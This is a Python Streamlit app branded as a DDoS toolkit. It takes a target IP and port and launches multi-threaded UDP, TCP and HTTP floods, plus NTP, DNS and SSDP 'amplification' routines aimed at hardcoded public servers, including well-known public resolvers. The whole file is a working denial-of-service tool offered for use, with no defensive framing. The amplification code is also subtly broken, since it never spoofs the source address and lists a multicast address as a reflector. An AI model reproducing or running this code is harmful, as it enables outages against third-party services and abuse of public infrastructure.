import socket  
import threading  
import os  
import random  
import time  
import streamlit as st  
import requests  
  
st.set_page_config(page_title="ZAIS AND EAST – DD0S TOOLZ", page_icon="🌀", layout="wide")  
  
# --- CYBERPUNK STYLING ---  
st.markdown("""  
    <style>  
    body {  
        background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1600&q=80');  
        background-size: cover;  
        color: #ff0000;  
        font-family: monospace;  
    }  
    .ascii-title {  
        font-size: 20px;  
        color: #ff0000;  
        text-align: center;  
        white-space: pre;  
        overflow: hidden;  
        border-right: .15em solid #ff0000;  
        animation: typing 3s steps(40, end), blink .75s step-end infinite;  
    }  
    @keyframes typing { from { width: 0 } to { width: 100% } }  
    @keyframes blink { from, to { border-color: transparent } 50% { border-color: #ff0000; } }  
    </style>  
""", unsafe_allow_html=True)  
  
st.markdown("""  
<pre class="ascii-title">  
███████╗ █████╗ ██╗███████╗    ██████╗ ██████╗ ██████╗ ███████╗  
██╔════╝██╔══██╗██║██╔════╝    ██╔══██╗██╔═══██╗██╔══██╗██╔════╝  
███████╗███████║██║███████╗    ██████╔╝██║   ██║██║  ██║███████╗  
╚════██║██╔══██║██║╚════██║    ██╔═══╝ ██║   ██║██║  ██║╚════██║  
███████║██║  ██║██║███████║    ██║     ╚██████╔╝██████╔╝███████║  
╚══════╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═════╝ ╚══════╝  
</pre>  
""", unsafe_allow_html=True)  
  
attack_type = st.selectbox("method", ["UDP Flood", "TCP Flood", "HTTP Flood", "NTP Amplification", "DNS Amplification", "SSDP Reflection"])  
ip = st.text_input("target")  
port = st.number_input("port", min_value=1, max_value=65535, value=80)  
threads = st.number_input("threads", min_value=1, value=500)  
duration = st.number_input("duration (seconds)", min_value=1, value=60)  
packet_size = st.number_input("packet size (bytes)", min_value=64, value=1024)  
  
stop_flag = threading.Event()  
packet_count = 0  
  
# --- BASIC FLOODS ---  
def udp_flood():  
    global packet_count  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    data = os.urandom(packet_size)  
    end_time = time.time() + duration  
    while time.time() < end_time and not stop_flag.is_set():  
        sock.sendto(data, (ip, port))  
        packet_count += 1  
    sock.close()  
  
def tcp_flood():  
    global packet_count  
    end_time = time.time() + duration  
    while time.time() < end_time and not stop_flag.is_set():  
        try:  
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            s.settimeout(0.5)  
            s.connect((ip, port))  
            s.send(os.urandom(packet_size))  
            s.close()  
            packet_count += 1  
        except:  
            pass  
  
def http_flood():  
    global packet_count  
    end_time = time.time() + duration  
    while time.time() < end_time and not stop_flag.is_set():  
        try:  
            requests.get(f"http://{ip}:{port}", headers={"User-Agent": str(random.randint(1000,9999))})  
            packet_count += 1  
        except:  
            pass  
  
# --- AMPLIFICATION ATTACKS ---  
def ntp_amp():  
    global packet_count  
    payload = b"\x17\x00\x03\x2a" + b"\x00" * 4  
    amplifiers = ["129.6.15.28", "132.163.97.1", "129.6.15.29"]  
    end_time = time.time() + duration  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    while time.time() < end_time and not stop_flag.is_set():  
        for amp in amplifiers:  
            try:  
                sock.sendto(payload, (amp, 123))  
                packet_count += 1  
            except:  
                pass  
  
def dns_amp():  
    global packet_count  
    payload = b"\xAA\xAA\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6F\x6F\x67\x6C\x65\x03\x63\x6F\x6D\x00\x00\xFF\x00\x01"  
    amplifiers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]  
    end_time = time.time() + duration  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    while time.time() < end_time and not stop_flag.is_set():  
        for amp in amplifiers:  
            try:  
                sock.sendto(payload, (amp, 53))  
                packet_count += 1  
            except:  
                pass  
  
def ssdp_reflection():  
    global packet_count  
    payload = b"M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nMan:\"ssdp:discover\"\r\nST:ssdp:all\r\nMX:2\r\n\r\n"  
    amplifiers = ["190.239.255.250", "239.255.255.250"]  
    end_time = time.time() + duration  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    while time.time() < end_time and not stop_flag.is_set():  
        for amp in amplifiers:  
            try:  
                sock.sendto(payload, (amp, 1900))  
                packet_count += 1  
            except:  
                pass  
  
def start_attack():  
    global packet_count  
    stop_flag.clear()  
    packet_count = 0  
    if attack_type == "UDP Flood":  
        method = udp_flood  
    elif attack_type == "TCP Flood":  
        method = tcp_flood  
    elif attack_type == "HTTP Flood":  
        method = http_flood  
    elif attack_type == "NTP Amplification":  
        method = ntp_amp  
    elif attack_type == "DNS Amplification":  
        method = dns_amp  
    else:  
        method = ssdp_reflection  
  
    for _ in range(threads):  
        threading.Thread(target=method, daemon=True).start()  
  
    start_time = time.time()  
    while time.time() - start_time < duration and not stop_flag.is_set():  
        st.metric("packets sent", packet_count)  
        time.sleep(0.1)  
    stop_flag.set()  
  
def stop_attack():  
    stop_flag.set()  
  
col1, col2 = st.columns(2)  
with col1:  
    if st.button("start"):  
        if ip:  
            start_attack()  
with col2:  
    if st.button("stop"):  
        stop_attack()
